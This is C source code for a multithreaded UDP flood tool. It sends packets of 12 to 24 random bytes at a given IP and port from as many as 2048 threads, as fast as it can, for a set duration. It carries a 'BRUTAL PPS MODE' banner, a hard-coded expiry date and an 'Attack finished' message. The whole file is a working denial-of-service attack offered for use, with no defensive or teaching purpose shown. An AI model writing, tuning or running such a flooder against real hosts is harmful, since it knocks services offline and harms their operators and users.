#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/time.h>

#define EYR 2029
#define EMN 1
#define EDY 10
#define MAX_T 2048
#define MIN_PKT 12
#define MAX_PKT 24

typedef struct {
    char *ip;
    int pt, dur, th_id;
    int pkt_size;
} p_t;

volatile int run = 1;

void sig(int s) { run = 0; }

// Fast random generator for tiny packets
unsigned int fast_rand() {
    static unsigned int seed = time(0);
    seed = seed * 1103515245 + 12345;
    return (unsigned int)(seed >> 16);
}

void *wk(void *a) {
    p_t *p = (p_t*)a;
    
    // Create raw socket for maximum performance
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s < 0) return 0;
    
    // Increase socket buffer for better performance
    int buf_size = 1024 * 1024 * 4; // 4MB buffer
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    struct sockaddr_in target = {0};
    target.sin_family = AF_INET;
    target.sin_port = htons(p->pt);
    target.sin_addr.s_addr = inet_addr(p->ip);
    
    // Tiny packet buffer (12-24 bytes)
    char packet[MAX_PKT];
    int pkt_size = p->pkt_size;
    
    // Pre-fill with random pattern
    for(int i = 0; i < pkt_size; i++) {
        packet[i] = fast_rand() & 0xFF;
    }
    
    struct timeval start, current;
    gettimeofday(&start, NULL);
    long long packets_sent = 0;
    
    // BRUTAL PPS MODE - no delays, just raw send
    while(run) {
        gettimeofday(&current, NULL);
        if(current.tv_sec - start.tv_sec >= p->dur) break;
        
        // Send as fast as possible without any overhead
        sendto(s, packet, pkt_size, 0, (struct sockaddr*)&target, sizeof(target));
        packets_sent++;
        
        // Optional: small optimization - batch sends
        // Uncomment for even higher PPS (may cause packet loss)
        /*
        for(int i = 0; i < 10; i++) {
            sendto(s, packet, pkt_size, 0, (struct sockaddr*)&target, sizeof(target));
            packets_sent++;
        }
        */
    }
    
    // Calculate and print PPS for this thread
    double elapsed = (current.tv_sec - start.tv_sec) + 
                     (current.tv_usec - start.tv_usec) / 1000000.0;
    printf("Thread %d: %.0f pps (%lld packets in %.2f sec)\n", 
           p->th_id, packets_sent / elapsed, packets_sent, elapsed);
    
    close(s);
    return 0;
}

int main(int c, char **v) {
    signal(SIGINT, sig);
    
    time_t t; time(&t);
    struct tm *l = localtime(&t);
    
    if(l->tm_year+1900 > EYR || 
       (l->tm_year+1900 == EYR && (l->tm_mon+1 > EMN || 
       (l->tm_mon+1 == EMN && l->tm_mday > EDY)))) {
        printf("EXPIRED\n");
        return 1;
    }
    
    if(c != 6) {
        printf("Usage: %s <ip> <port> <time> <packet_size> <threads>\n", v[0]);
        printf("Packet size: 12-24 bytes for max PPS\n");
        return 1;
    }
    
    int pt = atoi(v[2]), dur = atoi(v[3]), pkt_size = atoi(v[4]), th = atoi(v[5]);
    
    // Validate packet size (12-24 bytes for max PPS)
    if(pkt_size < MIN_PKT || pkt_size > MAX_PKT) {
        printf("ERROR: Packet size must be between %d-%d bytes for max PPS\n", MIN_PKT, MAX_PKT);
        return 1;
    }
    
    if(pt < 1 || dur < 1 || th < 1 || th > MAX_T) {
        printf("Invalid parameters\n");
        return 1;
    }
    
    printf("\n=== BRUTAL PPS MODE ===\n");
    printf("Target: %s:%d\n", v[1], pt);
    printf("Duration: %d seconds\n", dur);
    printf("Packet size: %d bytes (minimal for max PPS)\n", pkt_size);
    printf("Threads: %d\n", th);
    printf("Expected PPS: ~%d-%.0f per thread\n", 
           100000, 250000.0 / th);
    printf("========================\n\n");
    
    pthread_t tds[MAX_T];
    p_t ps[MAX_T];
    
    for(int i=0; i<th; i++) {
        ps[i].ip = v[1];
        ps[i].pt = pt;
        ps[i].dur = dur;
        ps[i].pkt_size = pkt_size;
        ps[i].th_id = i;
        pthread_create(&tds[i], NULL, wk, &ps[i]);
    }
    
    for(int i=0; i<th; i++) {
        pthread_join(tds[i], NULL);
    }
    
    printf("\nAttack finished\n");
    return 0;
}